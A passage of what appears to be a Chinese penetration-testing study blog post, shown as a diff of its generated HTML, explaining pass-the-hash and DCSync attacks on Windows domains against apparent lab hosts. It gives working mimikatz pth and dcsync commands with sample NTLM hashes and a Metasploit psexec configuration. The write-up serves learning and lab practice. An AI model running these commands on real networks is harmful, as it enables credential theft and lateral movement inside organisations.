<span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure>
+
+</li>
+<li><p><strong>mimikatz.exe</strong></p>
+<p>msf上有这个工具的插件，<code>load kiwi</code>就行</p>
+<p><code>mimikatz sekurlsa::pth</code>：本地伪造登录会话，直接用NTLM hash生成新会话（可配合runas、RDP、winrm等）。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># sekurlsa::pth /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">domain</span>:xxx /ntlm:&lt;NTLM_HASH&gt;<br>privilege::<span class="hljs-keyword">debug</span><br>sekurlsa::pth /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">domain</span>:<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.32</span> /ntlm:<span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c<br></code></pre></td></tr></table></figure>
+
+<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息</p>
+<p>对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012，可以使用AES keys代替NT hash</p>
+</li>
+<li><p><strong>C2内置</strong></p>
+<p>Metasploit模块：包含psexec&#x2F;smb&#x2F;WMIRemoteCommand等模块，都支持PTH。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 172.22.9.7<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass 00000000000000000000000000000000:2f1b57eefb2d152196836b0516abea80<br><span class="hljs-built_in">set</span> SMBDomain xiaorang.lab<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> LPORT 54526<br>run<br></code></pre></td></tr></table></figure>
+
+<p>CS等内置PTH横向模块，可利用NTLM hash远控或横向。</p>
+</li>
+</ol>
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://c1trus.top/24-active-directory/movement/3-ntlm/pth.html">PTH</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7712">浅探内网横向移动-Pass The Hash-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/10355979.html">5.内网渗透之PTH&amp;PTT&amp;PTK - bmjoker - 博客园</a></p>
+</blockquote>
+<h1 id="DCsync"><a href="#DCsync" class="headerlink" title="DCsync"></a>DCsync</h1><h2 id="什么是-DCSync"><a href="#什么是-DCSync" class="headerlink" title="什么是 DCSync"></a>什么是 DCSync</h2><p><strong>DCSync</strong> 是一种利用微软AD协议（MS-DRSR）“模拟域控制器行为”，从域控制器同步账户哈希（包括krbtgt、管理员等敏感账户hash）的攻击技术。</p>
+<p>我们先讲点前置知识：</p>
+<p>默认情况下，域内不同域控（DC）每隔15分钟会进行一次数据同步。当有新的域控加入时，它也会向其他域控发起同步请求，根据需要同步数据的多少可能多次进行。</p>
+<p>DCSync的原理就是利用域控制器之间的数据同步复制，通过目录复制服务（Directory Replication  Service，DRS）的GetNCChanges接口向域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议，该协议由两个RPC接口组成，分别是drsuapi和dsaop。</p>
+<p><strong>通俗易懂的讲，DCSync就是“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据。</strong></p>
+<p>由于这种攻击利用了Windows RPC协议，并不需要登陆域控或者在域控上落地文件，避免触发EDR告警，因此DCSync时一种非常隐蔽的凭据窃取方式。它常用在横向渗透和提权场景，工具如 mimikatz 提供了 <code>lsadump::dcsync</code> 命令实现该功能（DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash）</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>在默认情况下，只有</p>
+<ul>
+<li><p>Domain Admins（域管理员）</p>
+</li>
+<li><p>Enterprise Admins（企业管理员，林级，通常也会在各域具备相应能力）</p>
+</li>
+<li><p>Administrators（内置本地&#x2F;域 Administrators 组，通过组嵌套&#x2F;默认 ACL 往往具备等效能力）</p>
+</li>
+<li><p>Domain Controllers（域控制器计算机账户所在的组&#x2F;主体，即 Domain Controllers 组里的各 DC 的计算机账户）</p>
+</li>
+<li><p>Read-only Domain Controllers（如存在 RODC相关主体，具体取决于部署，但 RODC&#x2F;复制拓扑相关主体通常也会有对应复制所需的权限集合）</p>
+</li>
+</ul>
+<p>等高权限账户才有DCSync操作的权限，从更细粒度的ACL层面来说，DCSync需要以下两个权限</p>
+<ul>
+<li>目录复制同步（Replicating Directory Changes）</li>
+<li>目录复制同步所有项（Replicating Directory Changes All）</li>
+</ul>
+<p>所以我们可以对域内普通用户添加 ACL (Access Control List) 实现普通用户也能调用 DCSync 功能。</p>
+<blockquote>
+<p>注意：DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。</p>
+</blockquote>
+<p>我们以<code>fscan</code>的扫描结果为例</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[+] MS17-010 172.22.1.21    (Windows<span class="hljs-built_in"> Server </span>2008 R2 Enterprise 7601<span class="hljs-built_in"> Service </span>Pack 1)<br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们这台机子是 enterprise 用户，也就是说满足 DCSync 攻击的条件</p>
+<h2 id="打法"><a href="#打法" class="headerlink" title="打法"></a>打法</h2><p>尝试DCysnc获取哈希</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 可以用msf直接打</span><br>load kiwi<br>kiwi_cmd privilege::debug<br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment"># 或者上传mimikatz.exe，然后在目标机器上执行</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后可以PTH或者制作黄金票据</p>
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/581922712">域渗透中的DCSync技术分析 - 知乎</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/286137.html">内网渗透测试：DCSync 攻击技术的利用 - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="print-no-link">#学习总结</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>域渗透基础</div>
+      <div>http://example.com/2026/test45/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test65/" title="ctfshow web859_有跳板机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfshow web859_有跳板机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test64/" title="64Redis攻击利用总结">
+                        <span class="hidden-mobile">64Redis攻击利用总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
